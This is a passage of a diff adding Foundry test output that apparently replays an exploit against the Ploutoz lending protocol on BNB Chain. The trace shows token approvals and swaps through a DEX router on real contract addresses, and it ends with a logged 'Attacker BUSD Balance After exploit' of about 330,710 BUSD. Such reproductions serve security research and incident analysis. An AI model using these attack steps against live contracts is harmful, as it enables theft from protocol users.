+    │   │   ├─ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 1600000000000000000 [1.6e18], amount1In: 0, amount0Out: 0, amount1Out: 89829800631207601269238 [8.982e22], to: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Return] [1600000000000000000 [1.6e18], 89829800631207601269238 [8.982e22]]
+    ├─ [481] 0x1a66C619943280Df31d1F466ADa5BC4fb9F19117::loanTokenAddress() [staticcall]
+    │   └─ ← [Return] 0x55d398326f99059fF775485246999027B3197955
+    ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 89000000000000000000000 [8.9e22]
+    ├─ [24562] 0x55d398326f99059fF775485246999027B3197955::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ emit Approval(owner: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   └─ ← [Return] true
+    ├─ [52077] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokens(89000000000000000000000 [8.9e22], 0, [0x55d398326f99059fF775485246999027B3197955, 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1637659441 [1.637e9])
+    │   ├─ [893] 0x7EFaEf62fDdCCa950418312c6C91Aef321375A00::getReserves() [staticcall]
+    │   │   └─ ← [Return] 146162447674785922649797247 [1.461e26], 146146832803006724583411482 [1.461e26], 1637659441 [1.637e9]
+    │   ├─ [10834] 0x55d398326f99059fF775485246999027B3197955::transferFrom(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x7EFaEf62fDdCCa950418312c6C91Aef321375A00, 89000000000000000000000 [8.9e22])
+    │   │   ├─ emit Transfer(from: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x7EFaEf62fDdCCa950418312c6C91Aef321375A00, value: 89000000000000000000000 [8.9e22])
+    │   │   ├─ emit Approval(owner: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640563950457584007913129639935 [1.157e77])
+    │   │   └─ ← [Return] true
+    │   ├─ [31961] 0x7EFaEf62fDdCCa950418312c6C91Aef321375A00::swap(0, 88714131684455621709566 [8.871e22], Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   ├─ [8071] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::transfer(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 88714131684455621709566 [8.871e22])
+    │   │   │   ├─ emit Transfer(from: 0x7EFaEf62fDdCCa950418312c6C91Aef321375A00, to: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 88714131684455621709566 [8.871e22])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00) [staticcall]
+    │   │   │   └─ ← [Return] 146251447674785922649797247 [1.462e26]
+    │   │   ├─ [531] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::balanceOf(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00) [staticcall]
+    │   │   │   └─ ← [Return] 146058118671322268961701916 [1.46e26]
+    │   │   ├─ emit Sync(reserve0: 146251447674785922649797247 [1.462e26], reserve1: 146058118671322268961701916 [1.46e26])
+    │   │   ├─ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 89000000000000000000000 [8.9e22], amount1In: 0, amount0Out: 0, amount1Out: 88714131684455621709566 [8.871e22], to: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Return] [89000000000000000000000 [8.9e22], 88714131684455621709566 [8.871e22]]
+    ├─ [1081] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::symbol() [staticcall]
+    │   └─ ← [Return] "BUSD"
+    ├─ [531] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::balanceOf(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 330710465786434363679318 [3.307e23]
+    ├─ [425] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Attacker BUSD Balance After exploit", val: 330710465786434363679318 [3.307e23], decimals: 18)
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 551.62ms (23.84ms CPU time)
+
+Ran 2 test suites in 875.17ms (868.45ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
